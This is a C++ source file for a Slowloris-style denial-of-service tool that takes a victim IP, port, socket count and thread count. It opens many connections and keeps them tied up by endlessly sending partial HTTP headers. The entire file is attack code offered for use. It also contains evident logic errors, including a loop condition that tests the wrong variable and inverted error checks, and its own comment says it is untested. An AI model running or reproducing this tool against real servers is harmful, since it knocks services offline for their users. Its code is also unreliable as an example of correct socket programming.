/*
 * Not sure how well this'll work so far on Windows and Linux as it's yet to be tested. In theory, it should work fine due to kernel checks and lib substitution. It throws no errors on Windows currently.
 */

#include <iostream> // For I/O
#include <string> // For string manipulation 
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h> //Socket attrivutes/multi-threading
#include <cstring> // Get strlen() to get length of string
#include <vector> // Manipulatable arrays
#include <thread> // For thread handling
#include <chrono> // For cross-platform thread sleeping

#ifdef _WIN32 //This allows us to substitute Linux headers for Windows ones without having to deal with separate applications.
#include <WinSock2.h> //substitute for Linux socket headers
#include <ws2tcpip.h> // for inet_pton()
#pragma comment(lib, "Ws2_32.lib") // Resolves annoying Linker errors.
#else //Linux headers.
#include <sys/socket.h> //Socket defined here.
#include <arpa/inet.h> //Parses IP addresses into network readable.
#include <netinet/in.h> //Contains information regarding victim IP; port; family.
#endif

int ARGS = 4;

void initialSendSocket(int socketNum)
{
#pragma warning(disable:4996) //This is nasty, but it works.
	char incompleteHeader[255];
	sprintf(incompleteHeader, "GET /%d HTTP/1.1\r\n", rand() % 99999);
	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
	sprintf(incompleteHeader, "HOST: \r\n");
	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
	sprintf(incompleteHeader, "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
	sprintf(incompleteHeader, "Content-Length: %d\r\n", (rand() % 99999 + 1000));
	send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
#pragma warning(default: 4996) //restore warnings back to usual as we don't want to miss any other possible 4496's
}

void spamPartialHeaders(struct sockaddr_in victim, std::vector<int> socketList, int totalSockets)
{
	for (std::vector<int>::iterator it = socketList.begin(); it != socketList.end(); it++) //Replace standard for loop with vector iterator 
	{
		try
		{
			char incompleteHeader[50];
			sprintf(incompleteHeader, "X-a: %d\r\n", (rand() % 99999));
			send(*it, incompleteHeader, strlen(incompleteHeader), 0);
		}

		catch (std::exception ex)
		{
			socketList.erase(socketList.begin() + *it);
			socketList.push_back(socket(AF_INET, SOCK_STREAM, 0));
			connect(socketList.at(totalSockets - 1), (struct sockaddr*)&victim, sizeof(victim));
			initialSendSocket(*it);
		}
	}
}

int main(int argc, char* argv[])
{
	if (argc != (ARGS + 1))
	{
		std::cerr << "Arg 1: " << " VICTIM IP" << std::endl;
		std::cerr << "Arg 2: " << " VICTIM PORT NUM" << std::endl;
		std::cerr << "Arg 3: " << " NUM OF SOCKETS" << std::endl;
		std::cerr << "Arg 4: " << " NUM OF THREADS" << std::endl;
		std::cerr << "Usage: ./SlowLorrisAttack.cpp <dest_ip> <dest_port_num <num sockets> <num threads>" << std::endl;
		return 0;
	}

	const char* victimIP = argv[1];
	unsigned short victimPORT = atoi(argv[2]);
	int totalSockets = atoi(argv[3]);
	int numThreads = atoi(argv[4]);
	std::vector<std::thread> threadArray(numThreads);
	int socketDensity = totalSockets / numThreads;
	std::vector<std::vector<int>> socketListPartitions;
	struct sockaddr_in victim;
	victim.sin_family = AF_INET;
	victim.sin_port = htons(victimPORT);
	inet_pton(AF_INET, victimIP, &victim.sin_addr);

	for (int i = 0; i < numThreads; i++)
	{
		std::vector<int> currentSocketList;
		int numSockets = ((i == (numThreads - 1)) ? (socketDensity + totalSockets % numThreads) : socketDensity);

		for (int j = 0; i < numSockets; j++)
		{
			currentSocketList.push_back(socket(AF_INET, SOCK_STREAM, 0));

			if (currentSocketList.at(j) > 1)
			{
				std::cout << "Could not create socket " << j + 1 << " for thread #" << i + 1 << "." << std::endl;
				return 0;
			}

			std::cout << "Successfully created socket " << j + 1 << " for thread #" << i + 1 << "." << std::endl;
			int check = connect(currentSocketList.at(j), (struct sockaddr*)&victim, sizeof(victim));

			if (check > 0)
			{
				std::cout << "Could not connect socket " << j + 1 << " for thread #" << i + 1 << "." << std::endl;
				std::cout << "Perhaps a nonexistent IP or unopened port?" << std::endl;
				return 0;
			}

			std::cout << "Successfully connected socket " << j + 1 << " for thread #" << i + 1 << "." << std::endl;
			initialSendSocket(currentSocketList.at(j));
			std::cout << "Successfully sent incomplete header for socket " << j + 1 << " on thread #" << i + 1 << "." << std::endl;
		}

		socketListPartitions.push_back(currentSocketList);

		std::cout << "--------" << std::endl;
	}

	std::cout << "------------------" << std::endl;
	int iterations = 1;

	while (true)
	{
		std::cout << "Restarting attacks.." << std::endl;

		for (int i = 0; i < numThreads; i++)
		{
			std::cout << "Keeping sockets on thread #" << i + 1 << " open.." << std::endl;
			threadArray[i] = std::thread(spamPartialHeaders, victim, socketListPartitions.at(i), (socketListPartitions.at(i).size()));
			std::cout << "Attacks were syccessful on thread #" << i + 1 << "." << std::endl;
		}

		for (int i = 0; i < numThreads; i++)
		{
			threadArray[i].join();
			std::cout << "Attacks on thread #" << i + 1 << " paused." << std::endl;
		}

		std::cout << "Iteration " << iterations << " completed." << std::endl;
		iterations++;
		std::this_thread::sleep_for(std::chrono::milliseconds(15));  //replaces sleep(15) function as this one should work cross-platform.
		std::cout << "------------" << std::endl;
	}
}